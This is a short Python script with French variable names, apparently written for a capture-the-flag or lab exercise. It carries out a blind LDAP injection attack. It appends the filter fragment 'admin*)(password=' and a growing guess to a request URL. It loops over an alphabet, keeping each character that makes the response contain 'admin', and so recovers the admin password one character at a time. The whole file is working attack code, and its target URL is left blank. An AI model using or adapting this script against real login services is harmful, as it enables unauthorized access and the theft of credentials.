import requests

#admin*)(password=

url=""
part1="admin*)(password="
pasfini=1
alphabet="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@<>:,.-?!$*^()~\\_"
longueur=len(alphabet)
result=""

while pasfini==1 :
	for i in range(0,longueur) :
		pasfini=0
		requestTemp=url+part1+result+alphabet[i:(i+1)]
		r = requests.get(requestTemp)
		html=r.text
		print(result+alphabet[i:(i+1)])
		if "admin" in html:
			result=result+alphabet[i:(i+1)]
			pasfini=1
			print("oyea")
			break

		